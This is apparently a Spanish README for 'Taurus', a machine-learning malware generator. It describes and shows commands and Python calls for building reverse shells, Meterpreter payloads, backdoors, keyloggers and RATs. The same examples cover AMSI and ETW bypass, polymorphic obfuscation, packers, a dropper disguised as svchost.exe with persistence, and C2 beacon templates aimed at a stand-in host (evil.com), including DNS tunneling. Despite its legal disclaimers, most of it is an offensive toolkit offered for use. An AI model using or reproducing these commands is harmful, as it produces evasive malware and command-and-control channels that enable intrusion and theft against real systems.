# ML Malware Generator - Taurus

Sistema avanzado de generación de malware usando Machine Learning, diseñado para investigación en ciberseguridad y red teaming autorizado.

## ⚠️ ADVERTENCIA LEGAL

**SOLO PARA USO EDUCATIVO Y DE INVESTIGACIÓN AUTORIZADA**

Este proyecto está diseñado exclusivamente para:
- ✅ Investigación en ciberseguridad
- ✅ Pentesting y red teaming autorizado
- ✅ Entornos de laboratorio controlados
- ✅ Educación en seguridad informática

El uso malicioso de este software es **ILEGAL** y **ÉTICAMENTE INACEPTABLE**.

---

## 🚀 Características Principales

### 🤖 Modelos de Machine Learning
- **GAN (Generative Adversarial Network)**: Genera variaciones ofuscadas de payloads
- **Reinforcement Learning**: Optimiza técnicas de evasión automáticamente
- **Transformer**: Genera shellcode polimórfico coherente

### 💣 Tipos de Payloads
- Reverse shells (TCP/HTTP/HTTPS)
- Meterpreter payloads
- Backdoors persistentes
- Keyloggers y RATs
- Soporte para Windows, Linux, Android

### 🛡️ Técnicas de Evasión Avanzadas
- **AMSI Bypass**: Múltiples técnicas para evadir Windows Antimalware Scan Interface
- **ETW Patching**: Evasión de Event Tracing for Windows
- **Sandbox Detection**: Detección de entornos virtuales y sandboxes
- **Anti-Debugging**: Prevención de análisis dinámico
- **Process Injection**: Técnicas de inyección avanzadas

### 🎭 Ofuscación Multi-Capa
- Ofuscación de código tradicional
- Cifrado de strings
- API hashing
- **Transformaciones metamórficas** (NUEVO)
- **Sustitución de instrucciones** (NUEVO)
- **Predicados opacos** (NUEVO)
- **Generación de código basura** (NUEVO)
- Encoding polimórfico
- Reducción de entropía

### 📦 Empaquetado y Cifrado
- Compresión (zlib, LZMA, custom)
- Cifrado (AES, ChaCha20, XOR)
- Técnicas anti-unpacking
- Generación de droppers
- Payloads multi-etapa

### 🌐 Comunicación C2
- HTTP/HTTPS beaconing
- DNS tunneling
- Protocolos personalizados
- Cifrado de comunicaciones
- Plantillas de command handlers

### 🔍 Sistema de Detección
- Análisis estático local
- Integración con VirusTotal
- Cálculo de métricas de evasión
- Tests de funcionalidad

---

## 📦 Instalación

```bash
# Navegar al directorio
cd Taurus

# Instalar dependencias
pip install -r requirements.txt

# Instalar shimmy para compatibilidad con Gymnasium
pip install 'shimmy>=2.0'

# Verificar instalación
python cli.py info
```

---

## 🎯 Uso

### Modo Interactivo (NUEVO)

```bash
python cli.py interactive
```

El modo interactivo te guía paso a paso en la generación de payloads:
- Selección de tipo de payload
- Configuración de red
- Nivel de ofuscación
- Técnicas de evasión
- Configuración de salida

### Generar Payload

```bash
# Reverse shell básico
python cli.py generate --type reverse_shell --target windows --lhost 192.168.1.10 --lport 4444 --output payload.exe

# Meterpreter con ofuscación ML y evasión
python cli.py generate --type meterpreter --target windows --lhost 192.168.1.10 --lport 4444 --ml-mode --obfuscation-level 5 --output meterpreter.exe

# Backdoor persistente
python cli.py generate --type backdoor --target windows --lhost 192.168.1.10 --lport 4444 --output backdoor.exe
```

### Generación por Lotes (NUEVO)

```bash
# Generar 10 variantes polimórficas
python cli.py batch --type reverse_shell --target windows --lhost 192.168.1.10 --lport 4444 --count 10 --output-dir variants/
```

### Empaquetar Payload (NUEVO)

```bash
# Comprimir y cifrar payload existente
python cli.py pack --payload payload.exe --compression lzma --encryption aes --output packed_payload.exe
```

### Generar Plantilla C2 (NUEVO)

```bash
# HTTP/HTTPS beacon
python cli.py c2 --type http --server 192.168.1.100 --port 443 --output c2_http.ps1

# DNS tunneling
python cli.py c2 --type dns --server evil.com --output c2_dns.ps1

# Protocolo personalizado
python cli.py c2 --type custom --server 192.168.1.100 --port 8080 --output c2_custom.ps1
```

### Evaluar Payload

```bash
# Análisis local
python cli.py evaluate --payload payload.exe --local-only

# Análisis con VirusTotal (requiere API key)
python cli.py evaluate --payload payload.exe --virustotal
```

### Entrenar Modelos ML

```bash
# Entrenar agente RL
python cli.py train --model rl --timesteps 100000

# Entrenar todos los modelos
python cli.py train --model all --epochs 100
```

---

## 🏗️ Arquitectura

```
Taurus/
├── cli.py                          # Interfaz de línea de comandos
├── cli_additions.py                # Comandos CLI adicionales
├── ml_engine.py                    # Motor principal ML
├── config/
│   └── settings.py                 # Configuración del sistema
├── models/
│   ├── gan_generator.py            # Modelo GAN
│   ├── rl_evasion.py              # Agente RL
│   └── transformer_shellcode.py    # Modelo Transformer
├── generators/
│   ├── payload_factory.py          # Generador de payloads
│   ├── shellcode_gen.py           # Generador de shellcode
│   └── c2_templates.py            # Plantillas C2 (NUEVO)
├── obfuscation/
│   └── obfuscator.py              # Sistema de ofuscación mejorado
├── evasion/
│   └── evasion_techniques.py      # Técnicas de evasión (NUEVO)
├── testing/
│   └── detector.py                # Sistema de detección
├── utils/
│   ├── logger.py                  # Sistema de logging
│   ├── crypto.py                  # Utilidades criptográficas
│   └── payload_packer.py          # Empaquetador de payloads (NUEVO)
└── examples/
    ├── example_workflow.py         # Ejemplo básico
    ├── advanced_example.py         # Ejemplo avanzado (NUEVO)
    └── train_rl_example.py        # Ejemplo de entrenamiento
```

---

## 🔒 Controles de Seguridad

- **Watermarking**: Todos los payloads incluyen marca de agua identificable
- **Logging Obligatorio**: Registro de todas las generaciones
- **Kill Switch**: Mecanismo de desactivación remota
- **Environment Check**: Solo ejecuta en entornos autorizados

---

## 📊 Métricas de Evaluación

El sistema evalúa payloads con:
- **Detection Rate**: % de AV que detectan el payload
- **Stealth Score**: Nivel de evasión logrado
- **Functionality Score**: Si el payload funciona correctamente
- **Overall Score**: Puntuación combinada

---

## 🧪 Ejemplos de Uso

### Ejemplo Básico

```python
from generators.payload_factory import get_payload_factory
from obfuscation.obfuscator import get_obfuscator

# Generar payload
factory = get_payload_factory()
payload, metadata = factory.generate_reverse_shell_tcp(
    lhost="192.168.1.10",
    lport=4444,
    target_os="windows",
)

# Ofuscar
obfuscator = get_obfuscator()
obfuscated, meta = obfuscator.obfuscate_payload(payload, level=5)

# Guardar
factory.save_payload(obfuscated, "output.exe", metadata)
```

### Ejemplo Avanzado

Ver `examples/advanced_example.py` para un flujo completo que incluye:
- Generación de payload base
- Aplicación de técnicas de evasión
- Ofuscación avanzada
- Generación de variantes polimórficas
- Encoding multi-capa
- Empaquetado y cifrado
- Creación de payloads multi-etapa
- Generación de plantillas C2
- Evaluación completa

```bash
python examples/advanced_example.py
```

---

## 📝 Configuración

Edita `config/settings.py` para personalizar:

```python
# Configuración ML
ml_config.device = "cuda"  # o "cpu"
ml_config.gan_latent_dim = 128
ml_config.rl_algorithm = "PPO"

# Configuración de payloads
payload_config.obfuscation_level = 3
payload_config.enable_av_evasion = True

# VirusTotal (opcional)
detection_config.virustotal_api_key = "YOUR_API_KEY"
detection_config.virustotal_enabled = True

# Controles de seguridad
safety_config.enable_watermark = True
safety_config.enable_kill_switch = True
safety_config.mandatory_logging = True
```

---

## 🔬 Nuevas Características

### Técnicas de Evasión

```python
from evasion.evasion_techniques import get_evasion_orchestrator

evasion = get_evasion_orchestrator()

# Aplicar todas las técnicas de evasión
evaded, metadata = evasion.apply_all_evasions(
    payload,
    techniques=["amsi", "etw", "sandbox", "anti_debug"]
)

# Verificar seguridad del entorno
safety = evasion.check_environment_safety()
```

### Empaquetado de Payloads

```python
from utils.payload_packer import get_packer

packer = get_packer()

# Empaquetar payload
packed, metadata = packer.pack_payload(
    payload,
    compression="lzma",
    encryption="aes",
    anti_unpack=True
)

# Crear dropper
dropper, meta = packer.create_dropper(
    payload,
    drop_location="%TEMP%\\svchost.exe",
    persistence=True
)

# Payload multi-etapa
multi_stage, meta = packer.create_multi_stage_payload(
    stage1=dropper_code,
    stage2=payload,
    stage3=final_payload
)
```

### Plantillas C2

```python
from generators.c2_templates import get_c2_factory

factory = get_c2_factory()

# HTTP beacon
http_beacon = factory.create_http_beacon("192.168.1.100", 443)
beacon_code = http_beacon.generate_beacon_code()

# DNS tunnel
dns_tunnel = factory.create_dns_tunnel("evil.com")
tunnel_code = dns_tunnel.generate_beacon_code()
```

---

## 🛠️ Solución de Problemas

### Error: Missing shimmy installation

```bash
pip install 'shimmy>=2.0'
```

### Error: CUDA not available

Edita `config/settings.py`:
```python
ml_config.device = "cpu"
```

### Error: VirusTotal API key

Obtén una API key gratuita en [VirusTotal](https://www.virustotal.com/) y configúrala en `config/settings.py`.

---

## 📚 Recursos

- [TheFatRat](https://github.com/Screetsec/TheFatRat) - Inspiración original
- [Metasploit Framework](https://www.metasploit.com/) - Framework de pentesting
- [VirusTotal](https://www.virustotal.com/) - Análisis de malware
- [MITRE ATT&CK](https://attack.mitre.org/) - Framework de tácticas y técnicas

---

## ⚖️ Licencia y Ética

Este proyecto es solo para fines educativos y de investigación. El autor no se hace responsable del uso indebido de este software.

**Uso Responsable**:
- ✅ Investigación en ciberseguridad
- ✅ Pentesting autorizado
- ✅ Educación en seguridad
- ✅ Red teaming con permiso
- ❌ Actividades maliciosas
- ❌ Uso no autorizado
- ❌ Distribución de malware

---

## 🤝 Contribuciones

Las contribuciones son bienvenidas para mejorar las capacidades de investigación del proyecto.

---

## 📧 Contacto

Para preguntas sobre investigación en ciberseguridad y uso ético del proyecto.

---

**Recuerda**: Con gran poder viene gran responsabilidad. Usa este conocimiento para defender, no para atacar.

---

## 🎓 Créditos

Desarrollado para investigación en ciberseguridad y educación en seguridad ofensiva.

**Versión**: 1.0.0  
**Estado**: Production Ready  
**Última actualización**: 2025
